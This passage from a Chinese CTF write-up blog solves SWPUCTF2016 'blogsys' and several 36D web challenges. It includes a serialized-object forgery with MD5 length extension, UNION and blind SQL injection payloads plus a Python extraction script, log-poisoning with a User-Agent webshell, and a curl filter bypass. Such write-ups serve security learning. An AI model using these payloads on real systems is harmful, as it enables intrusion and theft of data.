class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'user'</span>]) &#123;</span><br><span class="line">    $username = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">    @mysql_conn();</span><br><span class="line">    $sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">    $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">    mysql_close();</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'userid'</span>]) &#123;</span><br><span class="line">        $id = intval($result[<span class="string">'userid'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸éš¾å‘ç°ï¼Œç™»å½•æˆåŠŸä¹‹åsessionå°±ä¼šå­˜åœ¨ï¼Œå¦‚æœç™»å½•ä¹‹åï¼Œå†åˆ é™¤è¯¥ç”¨æˆ·ï¼Œæ•°æ®åº“ä¸­å°±æ‰¾ä¸åˆ°è¯¥ç”¨æˆ·ä¿¡æ¯ï¼Œé‚£ä¹ˆ$idæœªè¢«åˆå§‹åŒ–ï¼Œå°±å¯æ§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">            @mysql_conn();</span><br><span class="line">            $sql1 = <span class="string">"select * from msg where userid= $id order by id"</span>;</span><br><span class="line">            $query = mysql_query($sql1);</span><br><span class="line">            $result1 = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">while</span> ($temp = mysql_fetch_assoc($query)) &#123;</span><br><span class="line">                $result1[] = $temp;</span><br><span class="line">            &#125;</span><br><span class="line">            mysql_close();</span><br><span class="line">            <span class="keyword">foreach</span> ($result1 <span class="keyword">as</span> $x =&gt; $o) &#123;</span><br><span class="line">                <span class="keyword">echo</span> display($o[<span class="string">'msg'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æŸ¥è¯¢æ—¶ï¼Œ$idæœªè¢«å¼•å·åŒ…è£¹ï¼Œaddslashesç­‰äºæ²¡ç”¨ï¼Œå†çœ‹api.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; unserialize(base64_decode($api));</span><br><span class="line">$a-&gt;do_method();</span><br></pre></td></tr></table></figure><p>$apiå‚æ•°æœªè¢«åˆå§‹åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯å¯æ§çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//api.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $username = addslashes(<span class="keyword">$this</span>-&gt;name);<span class="comment">//è¿›å…¥æ•°æ®åº“çš„æ•°æ®è¿›è¡Œè½¬ä¹‰</span></span><br><span class="line">       @mysql_conn();</span><br><span class="line">       $sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">       $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">       mysql_close();</span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>($result)) &#123;</span><br><span class="line">           <span class="comment">//åˆ©ç”¨ salt éªŒè¯æ˜¯å¦ä¸ºè¯¥ç”¨æˆ·</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;check === md5($result[<span class="string">'salt'</span>] . <span class="keyword">$this</span>-&gt;data . $username)) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">'(=-=)!!'</span>;</span><br><span class="line">               <span class="keyword">if</span> ($result[<span class="string">'role'</span>] == <span class="number">1</span>) &#123;<span class="comment">//æ£€æŸ¥æ˜¯å¦ä¸ºadminç”¨æˆ·</span></span><br><span class="line">                   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¦é€šè¿‡éªŒè¯ï¼Œéœ€è¦æ‹¿åˆ°md5çš„åŠ ç›å€¼ï¼Œè¿˜è¦åˆ¤æ–­æ˜¯å¦ä¸ºadminç”¨æˆ·ï¼Œæ—¢ç„¶åŒ…å«äº†common.phpï¼Œä¹Ÿå°±æ˜¯è¯´å­˜åœ¨å˜é‡è¦†ç›–æ¼æ´ï¼Œé‚£ä¹ˆ$açš„å±æ€§å€¼å¯æ§</p><p><code>$result[&#39;salt&#39;]</code>éšæœºç”Ÿæˆï¼Œæ‰¾ä¸€ä¸‹æ€ä¹ˆæ‰èƒ½æ‹¿åˆ°è¿™ä¸ªå€¼</p><p>åœ¨forget.phpæ–‡ä»¶ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($result)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'salt'</span>]) &#123;</span><br><span class="line">        $check = base64_encode(md5($result[<span class="string">'salt'</span>]));</span><br><span class="line">        $name = $result[<span class="string">'name'</span>];</span><br><span class="line">        header(<span class="string">"Location:/repass.php?username=$name&amp;check=$check&amp;mibao=$mibao&amp;pass=$pass"</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ›´æ”¹å¯†ç æ—¶ä¼šå‘ç”Ÿé¡µé¢è·³è½¬ï¼Œä¸ç®¡æˆåŠŸä¸å¦éƒ½ä¼šçˆ†å‡ºè·¯å¾„å’Œå‚æ•°ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº†base64åŠ å¯†ä¹‹åçš„</p><p><code>$result[&#39;salt&#39;]</code></p><p>ä¸‹é¢å°±æ˜¯å“ˆå¸Œæ‹“å±•æ”»å‡»ï¼Œå·¥å…·åœ¨è¿™<a href="https://github.com/JoyChou93/md5-extension-attack" target="_blank" rel="noopener">https://github.com/JoyChou93/md5-extension-attack</a></p><p>æ€è·¯æ¸…æ™°äº†ï¼Œå¿˜è®°å¯†ç è¿›è¡Œä¿®æ”¹æ—¶é€šè¿‡å°è¯•æ›´æ”¹adminè´¦æˆ·ï¼Œé¡µé¢è·³è½¬æ‹¿åˆ°<code>$result[&#39;salt&#39;]</code>ï¼Œåœ¨æ„é€ åºåˆ—åŒ–æ•°æ®ï¼Œå†ä¼ å€¼ç»™api.phpä¸­å¯æ§çš„$apiå‚æ•°ï¼Œ$idå¯æ§ï¼Œå†è¿›è¡Œæ•°æ®åº“æ•°æ®çš„æŸ¥è¯¢æ‹¿åˆ°flag</p><img src="/2020/08/04/SWPUCTF2016-Web-blogsys/1.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">var</span> $check= <span class="string">"6122c04e8a1f3529d556199960ef2556"</span>;</span><br><span class="line">    <span class="keyword">var</span> $data = <span class="string">"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00"</span>;</span><br><span class="line">    <span class="keyword">var</span> $method=<span class="string">"del_user"</span>;   <span class="comment">//è¦è°ƒç”¨çš„å‡½æ•°</span></span><br><span class="line">    <span class="keyword">var</span> $userid=<span class="string">"2"</span>;  <span class="comment">//è¦åˆ é™¤çš„ç”¨æˆ·</span></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> admin();</span><br><span class="line">$api = base64_encode(serialize($a));</span><br><span class="line"><span class="keyword">echo</span> $api;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦åˆ é™¤çš„ç”¨æˆ·é€šè¿‡æŸ¥çœ‹ç™»å½•ç”¨æˆ·cookieè§£å¯†ä¹‹åå¾—åˆ°çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@$login==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">@mysql_conn();</span><br><span class="line">$sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">mysql_close();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($result))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'passwd'</span>] == md5($password))</span><br><span class="line">&#123;</span><br><span class="line">$user_cookie = <span class="string">''</span>;</span><br><span class="line">$user_cookie .= $result[<span class="string">'userid'</span>];</span><br><span class="line">$user_cookie .= $result[<span class="string">'name'</span>];</span><br><span class="line">$user_cookie .= $result[<span class="string">'salt'</span>];</span><br><span class="line">$cookies = base64_encode($user_cookie);</span><br><span class="line"><span class="comment">//$cookies = $user_cookie;</span></span><br><span class="line">setcookie(<span class="string">"user"</span>,$cookies,time()+<span class="number">60</span>,<span class="string">'/web/'</span>);</span><br><span class="line">$_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = $username;</span><br><span class="line">header(<span class="string">'Location:/web/riji.php'</span>);</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯ä¼ å‚ï¼Œå†å¼€ä¸ªçª—å£æˆ–è€…æ¢ä¸ªæµè§ˆå™¨</p><img src="/2020/08/04/SWPUCTF2016-Web-blogsys/2.png" class=""><p>è¿™æ—¶å€™ä¼šå‘ç°ä¹‹å‰ç™»å½•çš„è´¦å·è¿˜ä¿æŒç™»å½•çš„çŠ¶æ€ï¼Œç›´æ¥æŸ¥flag(å­—æ®µå€¼é€ä¸ªçŒœæµ‹ï¼Œä¸º3)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()<span class="comment">#flag,msg,user</span></span><br><span class="line">?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x666c6167<span class="comment">#flag</span></span><br><span class="line">?id=-1%20union%20select%201,2,flag%20from%20flag</span><br></pre></td></tr></table></figure><img src="/2020/08/04/SWPUCTF2016-Web-blogsys/3.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;çŸ¥è¯†ç‚¹&quot;&gt;&lt;a href=&quot;#çŸ¥è¯†ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;çŸ¥è¯†ç‚¹&quot;&gt;&lt;/a&gt;çŸ¥è¯†ç‚¹
    
    </summary>
    
    
    
      <category term="SWPU" scheme="http://yoursite.com/tags/SWPU/"/>
    
  </entry>
  
  <entry>
    <title>36D-web-ak-challenge</title>
    <link href="http://yoursite.com/2020/07/31/36D-web-ak-challenge/"/>
    <id>http://yoursite.com/2020/07/31/36D-web-ak-challenge/</id>
    <published>2020-07-31T14:17:40.000Z</published>
    <updated>2020-08-03T02:29:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©å°±çœ‹äº†ç­¾åˆ°é¢˜æ¯”è¾ƒåŒ†å¿™ï¼Œæ²¡çŒœç€æ–‡ä»¶åå°±æ²¡åšäº†ï¼Œä»Šå¤©å¥½å¥½å¤ç°<a id="more"></a></p><h2 id="ç­¾åˆ°-è§‚å·±"><a href="#ç­¾åˆ°-è§‚å·±" class="headerlink" title="ç­¾åˆ°_è§‚å·±"></a>ç­¾åˆ°_è§‚å·±</h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>nginxæ—¥å¿—æ–‡ä»¶è·¯å¾„</li><li>UAå­—æ®µæ’å…¥ä¸€å¥è¯æœ¨é©¬</li></ul><h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜ç»™äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/php/i'</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¼€å§‹ä»¥ä¸ºè€ƒç‚¹åœ¨preg_match()å‡½æ•°çš„ç»•è¿‡ï¼Œå°è¯•äº†æ•°ç»„å’Œæ¢è¡Œç¬¦è¿›è¡Œç»•è¿‡phpè¿‡æ»¤ï¼Œå…ˆå…¥ä¸ºä¸»äº†ï¼Œä»¥ä¸ºè¿‡æ»¤äº†phpåç¼€flagæ–‡ä»¶å°±æ˜¯flag.phpï¼Œæ²¡æœ‰è€ƒè™‘åˆ°flag.txt,è¿˜åœ¨é‚£å°è¯•äº†åŠå¤©çš„è·¯å¾„ç©¿è¶Š</p><p>çŸ¥é“äº†æ–‡ä»¶åç›´æ¥çŒœæµ‹åœ¨æ ¹ç›®å½•ä¸‹é¢</p><img src="/2020/07/31/36D-web-ak-challenge/1.png" class=""><p>æ­£è§£åº”è¯¥ä¸æ˜¯è¿™æ ·åšçš„ï¼Œå…ˆçœ‹ä¸€ä¸‹nginxçš„æ—¥å¿—æ–‡ä»¶<code>?file=/var/log/nginx/access.log</code></p><img src="/2020/07/31/36D-web-ak-challenge/2.png" class=""><p>çœ‹åˆ°äº†åŒ…å«UAå­—æ®µï¼Œå°è¯•èƒ½ä¸èƒ½åœ¨UAå­—æ®µæ’å…¥ä¸€å¥è¯ğŸï¼ŒæŠ“åŒ…æ·»åŠ ä¸€ä¸‹æ”¾åŒ…</p><img src="/2020/07/31/36D-web-ak-challenge/3.png" class=""><p>å¯ä»¥çœ‹åˆ°æ ¹ç›®å½•ä¸‹çš„flag.txtæ–‡ä»¶ï¼Œå†è¯»å–</p><p>è¿˜æœ‰ä¸€ç§è§£æ³•ä½¿ç”¨ä¼ªåè®®data://ï¼Œä½†æ˜¯è¿™é¢˜è¡Œä¸é€šï¼Œallow_url_includeæ˜¯off(é™„ä¸Šä¼ªåè®®æ–‡ç« ï¼Œå¾ˆè¯¦ç»†<a href="https://blog.csdn.net/nzjdsds/article/details/82461043" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/82461043</a>)</p><h2 id="web1-è§‚å­—"><a href="#web1-è§‚å­—" class="headerlink" title="web1_è§‚å­—"></a>web1_è§‚å­—</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>curlå‘½ä»¤</li><li>curlå‘½ä»¤ã€‚èƒ½å¤Ÿæ›¿æ¢.</li></ul><h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜é€æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#flag in http://192.168.7.68/flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    $protocol = substr($url, <span class="number">0</span>,<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span>($protocol!=<span class="string">'http://'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'ä»…é™httpåè®®è®¿é—®'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\'|\"|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/'</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'ä»…é™åŸŸååœ°å€è®¿é—®'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">'curl '</span>.$url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç»™äº†flagçš„ä½ç½®ï¼Œé—®é¢˜æ˜¯æ€ä¹ˆç»•è¿‡è¿‡æ»¤è®©curlæ‰§è¡Œè¯»å–æ–‡ä»¶ä¿¡æ¯</p><p>è¿™é‡Œè¿›åˆ¶è½¬æ¢ä¸è¡Œï¼Œè¿‡æ»¤äº†0ï¼Œè½¬æ¢ä¸ºåè¿›åˆ¶ä¸º3232237380</p><p>è¿™é‡Œå°±è¦ç”¨åˆ°ä¸Šé¢é‚£çš„çŸ¥è¯†ç‚¹ç”¨(ã€‚)æ›¿ä»£(.)</p><img src="/2020/07/31/36D-web-ak-challenge/4.png" class=""><h2 id="web2-è§‚æ˜Ÿ"><a href="#web2-è§‚æ˜Ÿ" class="headerlink" title="web2_è§‚æ˜Ÿ"></a>web2_è§‚æ˜Ÿ</h2><h3 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>substr()é€—å·è¢«è¿‡æ»¤æ—¶ç”¨from x1 for x2æ›¿ä»£</li><li>ifæ›¿ä»£ï¼Œcase when then else end</li></ul><h3 id="è§£é¢˜æ­¥éª¤-2"><a href="#è§£é¢˜æ­¥éª¤-2" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜ï¼Œèƒ½é€‰æ‹©ä¸‰ä¸ªé“¾æ¥ï¼Œè·Ÿidæœ‰å…³ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯SQLæ³¨å…¥</p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°ç©ºæ ¼ã€é€—å·ã€asciiã€likeã€=ç­‰è¢«è¿‡æ»¤äº†</p><p><code>substr(database() from 1 for 1 )ä»£æ›¿substr(database(),1,1)</code></p><p><code>case whenä»£æ›¿if</code></p><p><code>ordä»£æ›¿ascii</code></p><p><code>regexpä»£æ›¿likeã€=</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://ac6a84ba-b399-4b05-8a0d-a103b394dfc9.chall.ctf.show/index.php?id=1^"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload1 = <span class="string">"case(ord(substr(database()from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)<span class="comment">#web1</span></span><br><span class="line">        payload2 = <span class="string">"case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)<span class="comment">#flag,page,user</span></span><br><span class="line">        payload3 = <span class="string">"case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)regexp(0x666c6167))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)<span class="comment">#FLAG_COLUMN,flag</span></span><br><span class="line">        payload4 = <span class="string">"case(ord(substr((select(group_concat(flag))from(flag))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)</span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(url+payload3)</span></span><br><span class="line">        r = requests.get(url+payload4)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"I asked nothing"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æœ¬æ¥æƒ³ç”¨äºŒåˆ†æ³•ï¼Œä½†æ˜¯è¿™é¢˜å¥½åƒä¸å¤ªåˆé€‚ï¼Œå¸¸è§„æ–¹æ³•é€Ÿåº¦ä¹ŸæŒºå¿«çš„ï¼Œå°±ç”¨å¸¸è§„çš„ç›²æ³¨æ–¹æ³•å¥½äº†</p><h2 id="web3-è§‚å›¾"><a href="#web3-è§‚å›¾" class="headerlink" title="web3_è§‚å›¾"></a>web3_è§‚å›¾</h2><h3 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>openssl_decryptå‡½æ•°åŠ å¯†</li><li>rand()å‡½æ•°æœ€å¤§å€¼</li><li>æš´åŠ›ç ´è§£</li></ul><h3 id="è§£é¢˜æ­¥éª¤-3"><a href="#è§£é¢˜æ­¥éª¤-3" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜æ˜¯ä¸€å¼ GIFå›¾ç‰‡ï¼ŒæŸ¥çœ‹æºç å‘ç°æç¤º</p><img src="/2020/07/31/36D-web-ak-challenge/5.png" class=""><p>ç›´æ¥è®¿é—®showImage.phpï¼Œæ‹¿åˆ°äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$key = substr(md5('ctfshow'.rand()),3,8);</span></span><br><span class="line"><span class="comment">//flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'image'</span>]))&#123;</span><br><span class="line">    $image=$_GET[<span class="string">'image'</span>];</span><br><span class="line">    $str = openssl_decrypt($image, <span class="string">'bf-ecb'</span>, $key);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($str))&#123;</span><br><span class="line">        header(<span class="string">'content-type:image/gif'</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»æºç ä¸­å°±å¯ä»¥çœ‹å‡ºè¦çˆ†ç ´å‡ºkeyçš„å€¼ï¼ŒæŸ¥ä¸€ä¸‹opessl_decryptå‡½æ•°çš„ç”¨æ³•ï¼Œå°è¯•çˆ†ç ´</p><p>æºç ä¸­åªè¦æˆ‘ä»¬èƒ½å¤Ÿå¾—åˆ°è§£å¯†åçš„æ–‡ä»¶åå¹¶ä¸”å­˜åœ¨ï¼Œå°±èƒ½å¤ŸåŒ…å«è¯¥æ–‡ä»¶</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹rand()å‡½æ•°çš„æœ€å¤§å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span>(getrandmax());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="number">32767</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±ç¢°æ’å‡ºkeyçš„å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">32768</span>;$i++)&#123;</span><br><span class="line">    $key = substr(md5(<span class="string">'ctfshow'</span>.$i),<span class="number">3</span>,<span 